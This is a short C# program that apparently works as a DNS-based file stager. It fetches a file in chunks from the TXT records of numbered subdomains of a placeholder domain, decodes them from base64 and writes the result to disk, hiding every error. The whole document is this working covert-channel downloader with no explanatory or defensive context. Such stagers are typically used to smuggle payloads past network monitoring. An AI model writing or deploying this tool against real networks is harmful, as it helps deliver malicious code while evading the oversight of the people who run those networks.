using System;
using System.IO;
using System.Linq;
using DnsClient;

class Program
{
    static void Main(string[] args)
    {
        try
        {
            string path = args[0];
            int size = int.Parse(args[1]);

            string b64String = "";
            for (int i = 1; i <= size; i++)
            {
                string a = GetTxtRecord($"{i}.domain.local");
                if (!string.IsNullOrEmpty(a))
                    b64String += a;
            }

            byte[] fileBytes = Convert.FromBase64String(b64String);
            File.WriteAllBytes(path, fileBytes);
        }
        catch { }
    }

    static string GetTxtRecord(string domain)
    {
        try
        {
            var lookup = new LookupClient();
            var result = lookup.Query(domain, QueryType.TXT);
            foreach (var record in result.Answers.TxtRecords())
                return record.Text.FirstOrDefault();
        }
        catch { }

        return null;
    }

}
